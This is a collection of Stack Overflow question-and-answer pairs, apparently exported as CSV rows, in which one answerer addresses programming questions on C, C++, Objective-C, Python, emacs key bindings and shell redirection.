"<p>I have made a quad curve path using the method CGPathAddQuadCurveToPoint. I got the path perfectly. But, I want to know all the coordinate points which are participated in the path.</p>

<p>Is there a way to retrieve all the coordinate points in a path? </p>

<p>If not do u have any other solution for retrieving all the points in a curve mathematically.</p>

<p>Thanks in advance,
Vamshi</p>
","9530","","<p>A quadratic curve is just that -- a curve.  It's impossible to get a list of <em>all</em> of the points on it because there are infinitely many points, and it's not a simple line segment.</p>

<p>See <a href=""http://developer.apple.com/DOCUMENTATION/GraphicsImaging/Reference/CGPath/Reference/reference.html#//apple%5Fref/doc/uid/TP30000959-CH1g-439779"" rel=""nofollow"">Getting Information about Quartz Paths</a> for a list of the functions you can use to query a <code>CGPath</code> object.  Unfortunately, it seems like the most useful information you're going to get is with <a href=""http://developer.apple.com/DOCUMENTATION/GraphicsImaging/Reference/CGPath/Reference/reference.html#//apple%5Fref/c/func/CGPathContainsPoint"" rel=""nofollow""><code>CGPathContainsPoint()</code></a>, which only tells you if a given point is contained within the area of the path.</p>
"
"<p>I want to format a NSDecimalNumber as a Dollars value ($1.50) but Im getting a crash.</p>

<p>This is my method:</p>

<pre><code>+(NSString*) formatPriceForUser:(NSDecimalNumber*)dPrice{

NSNumberFormatter *formatter;


if (!formatter) { 
    formatter = [[NSNumberFormatter alloc] init]; 
    [formatter setNumberStyle:NSNumberFormatterCurrencyStyle];
    [formatter setMaximumIntegerDigits:6];
    [formatter setMaximumFractionDigits:2];
} 
NSString* str = [formatter stringFromNumber:dPrice];
return str; 
}
</code></pre>

<p>The crash happens on the stringFromNumber invocation. </p>

<p>What am I doing wrong?</p>

<p>Thanks in advance.</p>

<p>Gonso</p>
","9530","","<p>You're not initializing the local variable <code>formatter</code>, so it's getting initialized with whatever garbage is left on the stack, and the initial <code>if (!formatter)</code> test is failing.  In C/C++/Objective-C, stack variables are NOT automatically initialized to zero.  The fix is to explicitly initialize <code>formatter</code> to <code>nil</code>:</p>

<pre><code>static NSNumberFormatter *formatter = nil;
</code></pre>

<p>Also note that by declaring it as <code>static</code>, it will persist across function calls, so you avoid reinitializing it for every call.</p>
"
"<p>I was looking at the program at <a href=""http://www0.us.ioccc.org/1988/westley.c"" rel=""nofollow"">http://www0.us.ioccc.org/1988/westley.c</a>, mentioned in <a href=""http://stackoverflow.com/questions/19/fastest-way-to-get-value-of-pi/39512#39512"">another SO answer</a> - it's supposed to print the value of pi, about 3.142, but when I compile it and run it I get <code>0.250</code>. It looks like when the GCC preprocessor (both 4.1.2 and 3.4.6 tested) runs on the code, it converts </p>

<pre><code>#define _ -F&lt;00||--F-OO--;
_-_-_
</code></pre>

<p>to</p>

<pre><code>-F&lt;00||--F-OO--;- -F&lt;00||--F-OO--;- -F&lt;00||--F-OO--;
</code></pre>

<p>but I think, for the program to work, it should be</p>

<pre><code>-F&lt;00||--F-OO--;--F&lt;00||--F-OO--;--F&lt;00||--F-OO--;
</code></pre>

<p>i.e. GCC is inserting an extra space before the ""macro"" expansion. Is that the way <code>#define</code> is supposed to work?  (Has that changed since 1988?)</p>

<p><em>EDIT</em>: Also, any information about how to prevent those spaces from showing up would be appreciated.</p>
","9530","","<p>Only much older preprocessors didn't insert that extra space -- note that original entry was submitted over 20 years ago in 1988, before the 1989 version of the C standard was standardized.  You can pass the <code>-traditional-cpp</code> flag to the GCC preprocessor, which causes it to imitate the behavior of old-fashioned C preprocessors, as opposed to ISO C preprocessors.</p>
"
"<p>say i have a directory with hi.txt and blah.txt and i execute the following command on a linux-ish command line</p>

<p><code>ls *.* | xargs -t -i{} echo {}</code></p>

<p>the output you will see is</p>

<pre><code>echo blah.txt
blah.txt
echo hi.txt
hi.txt
</code></pre>

<p>i'd like to redirect the stderr output (say 'echo blah.txt' fails...), <strong>leaving only the output from the xargs -t command</strong> written to std out, but it looks as if it's stderr as well.</p>

<p><code>ls *.* | xargs -t -i{} echo {} 2&gt; /dev/null</code></p>

<p>Is there a way to control it, to make it output to stdout?</p>
","9530","","<p><code>xargs -t</code> echos the commands to be executed to stderr before executing them.  If you want them to instead echo to stderr, you can pipe stderr to stdout with the <code>2&gt;&amp;1</code> construct:</p>

<pre><code>ls *.* | xargs -t -i{} echo {} 2&gt;&amp;1
</code></pre>
"
"<p>How can I get the <strong>number of ""1""s</strong> in the binary representation of a number without actually converting and counting ?</p>

<p>e.g.</p>

<pre><code>  def number_of_ones(n):
      # do something
      # I want to MAKE this FASTER (computationally less complex).
      c = 0
      while n:
    	c += n%2
    	n /= 2
      return c


&gt;&gt;&gt; number_of_ones(5)
    2
&gt;&gt;&gt; number_of_ones(4)
    1
</code></pre>
","9530","","<p>If you're actually concerned about speed, code it up in C (see <a href=""http://stackoverflow.com/questions/109023/best-algorithm-to-count-the-number-of-set-bits-in-a-32-bit-integer"">this question</a> for how), and interface with the C implementation using something like <a href=""http://docs.python.org/library/ctypes.html"" rel=""nofollow"">ctypes</a>.</p>
"
"<p>Just trying to get diff to work better for certain kinds of documents. With LaTeX, for example, I might have a long paragraph that is strictly just one line, but I don't want to see that entire paragraph if just a sentence is changed. Particularly if I'm running some kind of version control and a co-author edits the same paragraph (but not the same sentence) as me. I wouldn't want that to show up as a conflict.</p>

<p>That's a secondary question. The main question is whether I can use diff to look sentence-by-sentence. Thanks.</p>

<p><strong>Edit</strong></p>

<p><code>wdiff</code> is almost perfect. But is there a merge equivalent, as <code>diff</code> has with <code>diff3</code>?</p>
","9530","","<p><a href=""http://www.gnu.org/software/wdiff/""><code>wdiff</code></a> will give you a word-by-word diff instead of line-by-line.  I'm not aware of any sentence-by-sentence diff programs.</p>
"
"<p>I need a function that returns the ASCII value of a character, including spaces, tabs, newlines, etc...</p>

<p>On a similar note, what is the function that converts between hexadecimal, decimal, and binary numbers?</p>
","9530","","<p>You don't need a function to get the ASCII value -- just convert to an integer by an (implicit) cast:</p>

<pre><code>int x = 'A';  // x = 65
int y = '\t'; // x = 9
</code></pre>

<p>To convert a number to hexadecimal or decimal, you can use any of the members of the <code>printf</code> family:</p>

<pre><code>char buffer[32];  // make sure this is big enough!
sprintf(buffer, ""%d"", 12345);  // decimal: buffer is assigned ""12345""
sprintf(buffer, ""%x"", 12345);  // hex: buffer is assigned ""3039""
</code></pre>

<p>There is no built-in function to convert to binary; you'll have to roll your own.</p>
"
"<p>I have an array of unsigned chars in c I am trying to print in base 10, and I am stuck. I think this will be better explained in code, so, given:</p>

<pre><code>unsigned char n[3];
char[0] = 1;
char[1] = 2;
char[2] = 3;
</code></pre>

<p>I would like to print 197121.</p>

<p>This is trivial with small base 256 arrays. One can simply 1 * 256 ^ 0 + 2 * 256 ^ 1 + 3 * 256 ^ 2.</p>

<p>However, if my array was 100 bytes large, then this quickly becomes a problem. There is no integral type in C that is 100 bytes large, which is why I'm storing numbers in unsigned char arrays to begin with.</p>

<p>How am I supposed to efficiently print this number out in base 10?</p>

<p>I am a bit lost.</p>
","9530","","<p>There's no easy way to do it using only the standard C library.  You'll either have to write the function yourself (not recommended), or use an external library such as <a href=""http://gmplib.org/"">GMP</a>.</p>

<p>For example, using GMP, you could do:</p>

<pre><code>unsigned char n[100];  // number to print

mpz_t num;
mpz_import(num, 100, -1, 1, 0, 0, n);  // convert byte array into GMP format
mpz_out_str(stdout, 10, num);  // print num to stdout in base 10
mpz_clear(num);  // free memory for num
</code></pre>
"
"<p>I'm working with Qt and QWt3D Plotting tools, and extending them to provide some 3-D and 2-D plotting functionality that I need, so I'm learning some OpenGL in the process.</p>

<p>I am currently able to plot points using OpenGL, but only as circles (or ""squares"" by turning anti-aliasing off).  These points act the way I like - i.e. they don't change size as I zoom in, although their x/y/z locations move appropriately as I zoom, pan, etc.</p>

<p>What I'd like to be able to do is plot points using a myriad of shapes (^,&lt;,>,*,., etc.).  From what I understand of OpenGL (which isn't very much) this is not trivial to accomplish because OpenGL treats everything as a ""real"" 3-D object, so zooming in on any openGL shape but a ""point"" changes the object's projected size.</p>

<p>After doing some reading, I think there are (at least) 2 possible solutions to this problem: </p>

<ol>
<li><p>Use OpenGL textures.  This doesn't seem to difficult, but I believe that the texture images will get larger and smaller as I zoom in - is that correct? </p></li>
<li><p>Use OpenGL polygons, lines, etc. and draw *'s, triangles, or whatever.  But here again I run into the same problem - how do I prevent OpenGL from re-sizing the ""points"" as I zoom?  </p></li>
</ol>

<p>Is the solution to simply bite the bullet and re-draw the whole data set each time the user zooms or pans to make sure that the points stay the same size?  Is there some way to just tell openGL to not re-calculate an object's size?  </p>

<p>Sorry if this is in the OpenGL doc somewhere - I could not find it.</p>
","9530","","<p>There's no easy way to do what you want to do.  You'll have to dynamically resize the primitives you're drawing depending on the camera's current zoom.  You can use a technique known as <a href=""http://www.lighthouse3d.com/opengl/billboarding/"" rel=""nofollow""><em>billboarding</em></a> to make sure that your objects always face the camera.</p>
"
"<p>I have a program that I'm trying to decode. It is translated to C from another language (<a href=""http://en.wikipedia.org/wiki/Brainfuck"" rel=""nofollow"">whose name is not spoken here</a>), and as I want to understand how it works, I am slowly rewriting the code and simplifying it to use all the nice logical constructs C has to offer.</p>

<p>The following little bit keeps popping up in my code, with varying values of <code>X</code> and <code>Y</code>:</p>

<pre><code>ptr[X]--;
while(ptr[X])
  {
    ptr[X]--;
    ptr += Y;
  }
</code></pre>

<p><code>ptr</code> is of type <code>char *</code>, and I can't really make assumptions about the state of the array at any point because it's pretty deeply embedded in loops and dependent on input and output. I can successfully ""simplify"" that to:</p>

<pre><code>for(ptr[X]--; ptr[X]; ptr[X]--, ptr += Y);
</code></pre>

<p>But that's just awful. Ever so slightly better is:</p>

<pre><code>for(ptr[X]--; ptr[X]; ptr += Y) ptr[X]--;
</code></pre>

<p>I want to know if anyone can come up with a better simplification of the above code, I would greatly appreciate it. This occurs in no less than five places, and is impairing my ability to simplify and understand the flow control, so if anyone can provide a more consise/readable version, that would be awesome. If anyone can just offer any sort of fancy insight into that code, that would be awesome too, although I basically understand what it does.</p>

<p>Insight into the code for a specific <code>X</code> and/or <code>Y</code> can also help. <code>Y</code> tends to be between -2 and 2, and <code>X</code> is usually 1, for what its worth.</p>
","9530","","<p><code>ptr[X]</code> is equivalent to <code>*(ptr + X)</code>, so we can rewrite it as follows:</p>

<pre><code>for((*(ptr + X))--; *(ptr + X); (*(ptr + X))--, ptr += Y);
</code></pre>

<p>Now there's a lot of redundancy here, so we can simplify this to:</p>

<pre><code>char *ptr_plus_x = ptr + X;
for((*ptr_plus_x)--; *ptr_plus_x; (*ptr_plus_x)--, ptr_plus_x += Y);
</code></pre>

<p>Then we can get rid of <code>ptr_plus_x</code> entirely:</p>

<pre><code>ptr += X;
for((*ptr)--; *ptr; (*ptr)--, ptr += Y);
</code></pre>

<p>In English, we visit the memory locations at offsets X, X+Y, X+2Y, X+3Y, ..., decrementing each memory location, until we find a memory location that is 0.  But, the test for 0 always occurs after the decrement, so we're really looking for the first memory location in that sequence with a value of 1.  Once we find that, we decrement it to 0 and quit.</p>

<p>If Y is 1, then we decrement a string of consecutive memory locations going forwards, up to and including the first 1.  If Y is -1, the same thing happens, but searching backwards from offset X.  If Y is 0, an infinite loop occurs.  If Y is any other value, the search pattern skips various entries.</p>

<p>It's not a very intuitive function, so I can see why you're confused.</p>
"
"<p>I am playing MP3 audio via a URL using the MPMoviePlayer.  But when it plays, it flips to Landscape layout, and I would like it to remain in portrait layout.</p>

<p>Any ideas?</p>

<p>Thanks,
John</p>
","9530","","<p>Unfortunately, the movie player can only play movies in Landscape.  You'll have to reencode your movies rotated to 480x320 instead of 320x480.  After you play the movie, it changes the status bar's orientation, so you need to flip that back with <a href=""http://developer.apple.com/iphone/library/documentation/UIKit/Reference/UIApplication%5FClass/Reference/Reference.html#//apple%5Fref/occ/instm/UIApplication/setStatusBarOrientation:animated:"" rel=""nofollow""><code>setStatusBarOrientation:animated:</code></a>:</p>

<pre><code>[[UIApplication sharedApplication] setStatusBarOrientation:UIInterfaceOrientationPortrait animated:NO];
</code></pre>
"
"<p>considering this function</p>

<pre><code>double avg(double v1,double v2,...)
{
    double sum=v1+v2;
    int counter=2;
    double temp;
    va_list pargs;
    va_start(pargs,v2);
    while((temp=va_arg(pargs,double))!=0.0)
    {
        sum+=temp;
        counter++;
    }
    va_end(pargs);
    return sum/counter;
}
</code></pre>

<p>This call <code>printf(""%lf\n"",avg(3.0,4.5,4.5,3.0,0.0))</code> returns the correct result, but if I delete the last parameter <code>0.0</code> it prints <code>-321738127312000000000.0000000</code>, but sum and counter have the right values.
I kinda don't understand why I have to check that <code>!=0.0</code> and have the last param <code>0.0</code></p>
","9530","","<p>Because without any other external information, the function has no idea how many arguments were passed in.  There are several strategies to solve this problem: include an explicit argument which is the number of extra arguments, use a format string to define the arguments (such as with the <code>printf</code> and <code>scanf</code> family of functions), or use a sentinel value such as 0 to declare the end of the arguments.</p>

<p>In your case, if you omit the sentinel, the function just keeps walking down the stack until it hits a zero value, and depending on what data is on the stack, you could get wildly different results, all incorrect.</p>
"
"<p>Recently I've been working on some embedded devices, where we have some structs and unions that need to be initialized at compile time so that we can keep certain things in flash or ROM that don't need to be modified, and save a little flash or SRAM at a bit of a performance cost.  Currently the code compiles as valid C99, but without this adjustment it used to compile as C++ code as well, and it would be great to support things being compiled that way as well.  One of the key things that prevents this is that we're using C99 designated initializers which do not work within the C subset of C++.   I'm not much of a C++ buff, so I'm wondering what simple ways there might be to make this happen in either C++ compatible C, or in C++ that still allow initialization at compile time so that the structs and unions not need be initialized after program startup in SRAM.</p>

<p>One additional point of note: a key reason for designated initializer usage is initalizing as NOT the first member of a union.  Also, sticking with standard C++ or ANSI C is a plus in order to maintain compatibility with other compilers (I know about the GNU extensions that provide something like designated initializers without C99).</p>
","9530","","<p>I'm not sure you can do it in C++.  For the stuff that you need to initialize using designated initializers, you can put those separately in a <code>.c</code> file compiled as C99, e.g.:</p>

<pre><code>// In common header file
typedef union my_union
{
    int i;
    float f;
} my_union;

extern const my_union g_var;

// In file compiled as C99
const my_union g_var = { .f = 3.14159f };

// Now any file that #include's the header can access g_var, and it will be
// properly initialized at load time
</code></pre>
"
"<p>I'd like to bind <kbd>Ctrl</kbd> + <kbd>R</kbd> to <code>'isearch-backward</code> and bind <kbd>Ctrl</kbd> + <kbd>Shift</kbd> + <kbd>R</kbd> to <code>'tags-apropos</code> but I can't distinguish between the two key presses.</p>

<p>Can emacs differentiate between <kbd>Ctrl</kbd> + <kbd>R</kbd> and <kbd>Ctrl</kbd> + <kbd>Shift</kbd> + <kbd>R</kbd>?  What should go into my .emacs file to allow this keybinding?</p>
","9530","","<p>Yes -- one is <code>""\C-r""</code>, the other is <code>""\C-R""</code>.  They can easily be bound to separate commands.  For example, this should do the trick if placed in your <code>.emacs</code> file:</p>

<pre><code>(global-set-key ""\C-R"" 'tags-apropos)
</code></pre>
"
"<p>I have 2 threads and a shared <code>float</code> global.  One thread only writes to the variable while the other only reads from it, do I need to lock access to this variable?  In other words:</p>

<pre><code>volatile float x;

void reader_thread() {
    while (1) {
        // Grab mutex here?
        float local_x = x;
        // Release mutex?
        do_stuff_with_value(local_x);
    }
}

void writer_thread() {
    while (1) {
        float local_x = get_new_value_from_somewhere();
        // Grab mutex here?
        x = local_x;
        // Release mutex?
    }
}
</code></pre>

<p>My main concern is that a load or store of a <code>float</code> not being atomic, such that <code>local_x</code> in <code>reader_thread</code> ends up having a bogus, partially updated value.</p>

<ol>
<li>Is this a valid concern?</li>
<li>Is there another way to guarantee atomicity without a mutex?</li>
<li>Would using <code>sig_atomic_t</code> as the shared variable work, assuming it has enough bits for my purposes?</li>
</ol>

<p>The language in question is C using pthreads.</p>
","9530","","<p>According to section 24.4.7.2 of the GNU C library documentation:</p>

<blockquote>
  <p>In practice, you can assume that <code>int</code> and other integer types no longer than <code>int</code> are atomic. You can also assume that pointer types are atomic; that is very convenient. Both of these assumptions are true on all of the machines that the GNU C library supports and on all POSIX systems we know of.</p>
</blockquote>

<p><code>float</code> technically doesn't count under these rules, although if a <code>float</code> is the same size as an <code>int</code> on your architecture, what you could do is make your global variable an <code>int</code>, and then convert it to a float with a union every time you read or write it.</p>

<p>The safest course of action is to use some form of mutex to protect accesses to the shared variable.  Since the critical sections are extremely small (reading/writing a single variable), you're almost certainly going to get better performance out of a light-weight mutex such as a spin lock, as opposed to a heavy-weight mutex that makes system calls to do its job.</p>
"
"<p>If you take an existing C code base and compile it with a C++ compiler, what sort of issues can you expect to crop up? For example, I think that assigning an integer to an value with an enumerated type will fail in C++, whereas it's legal ( if a bit nasty ) in C.</p>

<p>If I don't wrap all my C files in ""extern C { ... }"", am I going to get name-mangling where I least expect it? Is there some reason why I really shouldn't do this?</p>

<p>For background, we have a very large code-base written in C. For a few years we've been jumping through hoops to do things that would come naturally via C++ ( homebrewed inheritance, for example ). We'd like to start moving towards C++, but in a gradual fashion; getting our CORBA-like framework to support it, and refactoring modules as we go along to take advantage of the more natural approach C++ would provide.</p>
","9530","","<p>See <a href=""http://david.tribble.com/text/cdiffs.htm"">Incompatibilities between ISO C and ISO C++</a> for a <em>very</em> detailed list of all of the incompatibilities.  There are a lot of subtle issues, including some which don't immediately manifest in a compiler error.  For example, one issue that can be a problem is the size of character constants:</p>

<pre><code>// In C, prints 4.  In C++, prints 1
printf(""%d\n"", sizeof('A'));
</code></pre>
"
"<p>I have the algorithm for sort by last name, but I am having trouble figuring out how to sort by last name, then if two people have the same last name, sort by their first name.</p>

<pre><code>void sortLastName(FRIEND friends[ARRAY_MAX], int&amp; count) {

    FRIEND temp;

    for(int i = 0; i &lt; count - 1; i++) {
        for (int j = i + 1; j &lt; count; j++) {
            if (stricmp(friends[i].lastName, friends[j].lastName) &gt; 0)  {
                temp = friends[i];    //swapping entire struct
                friends[i] = friends[j];
                friends[j] = temp;
            }
        }
    }
}
</code></pre>

<p>=== EDIT ====================</p>

<p>I don't want to use <code>STD sort()</code></p>
","9530","","<p>First, compare the last names.  If they are equal, then compare the first names:</p>

<pre><code>int compareResult = stricmp(friends[i].lastName, friends[j].lastName);
if(compareResult == 0)
    compareResult = stricmp(friends[i].firstName, friends[j].firstName);
if(compareResult &lt; 0)
    // swap friends[i] and friends[j]
</code></pre>
"
"<p>OK, I am considering of getting into c++ development in coming months (there is no set date).  I am vaguely familiar with the language (primarily C), as well as some basics of OO, MI, templates, exceptions, patterns, used STL. And now I am at the point in time where I would like to master the language in depth. And the natural question is whether I should<br />
start with current <strong>C++03</strong> or <strong>C++0x</strong> standard. </p>

<p>Please suggest what the best way to go from a user to guru, given that new standard is almost here, and likely to remain for many years to come.</p>

<p>Thanks</p>
","9530","","<p>Learn the older standard C++03.  C++0X is still a couple years away (at least) from even being ratified as a standard.  Once it's standardized, it'll take time before <em>any</em> conforming implementations appear that support all of its features, and it'll take an even <em>longer</em> time before C++0X implementations become significantly popular and oft-used.</p>
"
"<p>I keep getting this error:</p>

<p><img src=""http://img514.imageshack.us/img514/2203/help.tif"" alt=""alt text"" /></p>

<p>What is it? I never even called ""isEqualToString"".</p>

<p>Here Is my Joke.M</p>

<pre><code>@implementation Joke
@synthesize joke;
@synthesize rating;


- (id)init {
[super init];
return self;
 }

- (void)dealloc {
[joke release];
[super dealloc];	
}

+ (id)jokeWithValue:(NSString *)joke {
Joke *j = [[Joke alloc] init];
j.joke = joke;
return [j autorelease];
}

@end
</code></pre>

<p>And here is joke.h</p>

<pre><code>@interface Joke : NSObject {
NSString *joke;
int rating;
}

+ (id)jokeWithValue:(NSString *)joke;

@property (readwrite, copy) NSString *joke;
@property (readwrite) int rating;

@end
</code></pre>

<p>And here is where joke is being used</p>

<pre><code>#import ""TableViewController.h""
#import ""Joke.h""

@implementation TableViewController
@synthesize jokes;

- (id)initWithCoder:(NSCoder *)coder {
if (self = [super initWithCoder:coder]) {
    self.jokes = [NSMutableArray arrayWithObjects:
				  [Joke jokeWithValue:@""If you have five dollars and Chuck Norris has five dollars, Chuck Norris has more money than you""],
				  [Joke jokeWithValue:@""There is no 'ctrl' button on Chuck Norris's computer. Chuck Norris is always in control.""],
				  [Joke jokeWithValue:@""Apple pays Chuck Norris 99 cents every time he listens to a song.""],
				  [Joke jokeWithValue:@""Chuck Norris can sneeze with his eyes open.""],
				  nil];
    }
return self;
 }

- (void)viewDidLoad {
self.navigationItem.leftBarButtonItem = self.editButtonItem;
} 


 - (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView { // Saying how many sections wanted (Just like in address, where sorts by first name)
return 1;
 }

 - (NSInteger)tableView:(UITableView *)tableView 
numberOfRowsInSection:(NSInteger)section {
return [jokes count];
 }


 - (UITableViewCell *)tableView:(UITableView *)tableView 
     cellForRowAtIndexPath:(NSIndexPath *)indexPath {
  static NSString *CellIdentifier = @""Team"";    
  UITableViewCell *cell = 
[tableView dequeueReusableCellWithIdentifier:CellIdentifier];
  if (cell == nil) {
    cell = [[[UITableViewCell alloc] 
			 initWithFrame:CGRectZero 
             reuseIdentifier:CellIdentifier] autorelease];
   }
cell.text = [jokes objectAtIndex:indexPath.row];
   return cell;
  }

 - (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath  *)indexPath {
 }


 - (void)viewWillAppear:(BOOL)animated {
[super viewWillAppear:animated];
 }

 - (void)viewDidAppear:(BOOL)animated {
[super viewDidAppear:animated];
 }

 - (BOOL)shouldAutorotateToInterfaceOrientation:
 (UIInterfaceOrientation)interfaceOrientation {
  return (interfaceOrientation != UIInterfaceOrientationPortraitUpsideDown);
  }

 - (void)didReceiveMemoryWarning {
[super didReceiveMemoryWarning]; 
 }

 - (void)dealloc {
 [jokes release];
 [super dealloc];
 }

 @end
</code></pre>

<p>Thanks</p>
","9530","","<p>The stack trace will help you find exactly what is calling <code>isEqualToString:</code>.  Unfortunately, it's not giving you any symbols, so you'll have to do a little digging.</p>

<p>In Objective-C methods, there are two hidden parameters which are always passed as the first two arguments: <code>self</code>, a pointer to the object to which the message is being sent, and <code>_cmd</code>, a pointer to a C string containing the name of the message being sent.  Examining the <code>_cmd</code> arguments in the stack frames will help you debug the problem.</p>

<p>The first thing you want to do is set a breakpoint right before the exception is thrown.  Open up the debugger console (Cmd+Shift+R) and add a breakpoint to the function on the top of the stack trace by typing:</p>

<pre><code>break 2438463755
</code></pre>

<p>Now run your app, and the debugger should break right before throwing the exception.  It should also give you a full symbolic backtrace; if not, you'll have to walk the stack yourself.  You can walk the stack and print out the value of the various <code>_cmd</code> parameters.</p>
"
"<p>You can define 2 variables of the same type in a for loop:</p>

<pre><code>int main() {
  for (int i = 0, j = 0; i &lt; 10; i += 1, j = 2*i) {
    cout &lt;&lt; j &lt;&lt; endl;
  }
}
</code></pre>

<p>But it is illegal to define variables of different types:</p>

<pre><code>int main() {
  for (int i = 0, float j = 0.0; i &lt; 10; i += 1, j = 2*i) {
    cout &lt;&lt; j &lt;&lt; endl;
  }
}
</code></pre>

<p>Is there a way to do this? (I don't need to use <code>i</code> inside the loop, just <code>j</code>.)</p>

<p>If you have totally hacked and obscure solution, It's OK for me. </p>

<p>In this contrived example I know you could just use <code>double</code> for both variables. I'm looking for a general answer.</p>

<p>Please do not suggest to move any of the variables outside of for body, probably not usable for me as one is an iterator that has to disappear just after the loop and the for statement is to be enclosed in my <code>foreach</code> macro:</p>

<pre><code>#define foreach(var, iter, instr) {                  \
    typeof(iter) var##IT = iter;                     \
    typeof(iter)::Element var = *var##IT;            \
    for (; var##_iterIT.is_still_ok(); ++var##IT, var = *var#IT) {  \
      instr;                                         \
    }                                                \
  }
</code></pre>

<p>It can be used thus:</p>

<pre><code>foreach(ii, collection, {
  cout &lt;&lt; ii;
}). 
</code></pre>

<p>But I need something that will be used like that:</p>

<pre><code>foreach(ii, collection)
  cout &lt;&lt; ii;
</code></pre>

<p>Please do not introduce any runtime overhead (but it might be slow to compile). </p>
","9530","","<p>If you're having trouble with macros, there's a standard <code>do..while</code> trick that works perfectly:</p>

<pre><code>#define MYFOR(init, test, post, body) \
    do \
    { \
        init \
        for( ; test; post) \
            body \
    } while(0)
</code></pre>

<p>Use it as follows:</p>

<pre><code>MYFOR( int i = 0; float j = 0.0f; , i &lt; 10 , (i += 1, j = 2.0f * i),
    {
         cout &lt;&lt; j &lt;&lt; endl;
    } );
</code></pre>

<p>It's ugly, but it does what you want: the scope of <code>i</code> and <code>j</code> is limited by the <code>do..while</code> loop from the macro, and it requires a semicolon at the end, so you won't get bitten by putting it in the predicate of an if/else statement.</p>
"
"<p>What is the correct plural form of the portmanteau <i>mutex</i>.  Is it <i>mutexes</i> or <i>mutices</i>?</p>
","9530","","<p>There's no <em>official</em> correct form because 'mutex' hasn't gained wide enough circulation to enter any of the major English dictionaries.  Thus, the most correct term is whatever is used most by people.  And I think that Google hits are a pretty good indicator of (relative) usage frequency, as <a href=""http://stackoverflow.com/questions/866837/plural-form-of-word-mutex/866851#866851"">great_lama has pointed out</a>.</p>

<p>Other English nouns that end in <em>-ex</em> or <em>-ix</em>:</p>

<ul>
<li>Affix</li>
<li>Annex</li>
<li>Apex</li>
<li>Appendix</li>
<li>Cervix</li>
<li>Circumflex</li>
<li>Complex</li>
<li>Cortex</li>
<li>Crucifix</li>
<li>Duplex</li>
<li>Helix</li>
<li>Ibex</li>
<li>Index</li>
<li>Infix</li>
<li>Latex</li>
<li>Matrix</li>
<li>Phoenix</li>
<li>Prefix</li>
<li>Postfix</li>
<li>Reflex</li>
<li>Remix</li>
<li>Suffix</li>
<li>Vertex</li>
<li>Vortex</li>
</ul>

<p>And lots more less common words.  If you look up these in the dictionary, you'll find that most of them have <em>both</em> plurals shown as acceptable.  Several have only the <em>-exes</em>/<em>-ixes</em> form, but few or none (depending on the dictionary you use) have only the <em>-ices</em> form.</p>

<p>In conclusion, I believe <em>mutexes</em> to be the correct plural form of <em>mutex</em>.</p>
"
"<p>Is this possible:</p>

<pre><code>myList = []

myList[12] = 'a'
myList[22] = 'b'
myList[32] = 'c'
myList[42] = 'd'
</code></pre>

<p>When I try, I get:</p>

<pre><code># IndexError: list assignment index out of range #
</code></pre>
","9530","","<p>You'll have to pre-fill it with something (e.g. <code>0</code> or <code>None</code>) before you can index it:</p>

<pre><code>myList = [None] * 100  # Create list of 100 'None's
myList[12] = 'a'  # etc.
</code></pre>

<p>Alternatively, use a dict instead of a list, as <a href=""http://stackoverflow.com/questions/869778/populating-a-list-array-by-index-in-python/869805#869805"">Alex Martelli suggested</a>.</p>
"
"<p>I know there are lots of posts about collision detection generally for sprites moving about a 2D plane, but my question is slightly different.</p>

<p>I'm inserting circles into a 2D plane.  The circles have variable radii.  I'm trying to optimize my method of finding a random position within the plane where I can insert a new circle without it colliding with any other circles already on the plane.  Right now I'm using a very ""un-optimized"" approach that simply generates a random point within the plane and then checks it against all the other circles on the plane.</p>

<p>Are there ways to optimize this?  For this particular app, the bounds of the plane can only hold 20-25 circles at a time and typically there are between 5-10 present.  As you would expect, when the number of circles approaches the max that can fit, you have to test many points before finding one that works.  It gets very slow.</p>

<p>Note: safeDistance is the radius of the circle I want to add to the plane.</p>

<p>Here's the code:</p>

<pre><code>- (CGPoint)getSafePosition:(float)safeDistance {
// Point must be far enough from edges
// Point must be far enough from other sprites

CGPoint thePoint;
BOOL pointIsSafe = NO;

int sd = ceil(safeDistance);

while(!pointIsSafe) {

	self.pointsTested++; // DEBUG

	// generate a random point inside the plane boundaries to test
	thePoint = CGPointMake((arc4random() % ((int)self.manager.gameView.frame.size.width - sd*2)) + sd, 
						   (arc4random() % ((int)self.manager.gameView.frame.size.height - sd*2)) + sd);

	if(self.manager.gameView.sprites.count &gt; 0) {
		for(BasicSprite *theSprite in self.manager.gameView.sprites) {

			// get distance between test point and the sprite position
			float distance = [BasicSprite distanceBetweenPoints:thePoint b:theSprite.position];

			// check if distance is less than the sum of the min safe distances of the two entities
			if(distance &lt; (safeDistance + [theSprite minSafeDistance])) {
				// point not safe
				pointIsSafe = NO;
				break;
			}

			// if we get here, the point did not collide with the last tested point
			pointIsSafe = YES;
		}
	}
	else {
		pointIsSafe = YES;
	}
}

return thePoint;
}
</code></pre>
","9530","","<p>Honestly, with only 20-25 circles, you're not going to get much of a speed boost by using a fancier algorithm or data structure (e.g. a <a href=""http://en.wikipedia.org/wiki/Quadtree"" rel=""nofollow"">quadtree</a> or a <a href=""http://en.wikipedia.org/wiki/Kd%5Ftree"" rel=""nofollow"">kd-tree</a>).  <a href=""http://www.codinghorror.com/blog/archives/000957.html"" rel=""nofollow"">Everything is fast for small n</a>.</p>

<p>Are you absolutely sure this is the bottleneck in your application?  Have you profiled?  If yes, then the way you're going to speed this up is through microoptimization, not through advanced algorithms.  Are you making lots of iterations through the while loop because most of the plane is unsafe?</p>
"
"<p>All I need this for is strcpy().</p>

<p>I want to see whether the first three bytes of a buffer(byte array) are ""JMX"" as string.</p>

<p>This is what I did so far:</p>

<pre><code>char * ddj;
strcpy( ddj, buffer ); //buffer is BYTE[]
if ( strcmp( ""JMX"", ddj ) == 0 ) //check first three chars are ""JMX""
{
    buffer += 20;   //increase the index with 20
    size -= 20;     //int
}
</code></pre>

<p>I get exception at strcmp() line. What is the problem?</p>

<p><em>I wish I was writing this in C# :(</em></p>
","9530","","<p>You're not allocating any memory for <code>ddj</code>.  Since it's a local variable, it's allocated on the stack.  Local variables are not initialized to 0/false/NULL by default, so the value of <code>ddj</code> immediately after it's declared is undefined -- it will have the value of whatever is left in memory at that particular location on the stack.  Any attempt to dereference it (that is, to read or write the memory at which it's pointing) will have undefined behavior.  In your case, it's crashing because it's pointing to an invalid address.</p>

<p>To fix the problem, you need to allocate storage for <code>ddj</code>.  You can either allocate static storage on the stack, or dynamic storage on the heap.  To allocate static storage, do:</p>

<pre><code>// Allocate 64 bytes for ddj.  It will automatically be deallocated when the function
// returns.  Be careful of buffer overflows!
char ddj[64];
</code></pre>

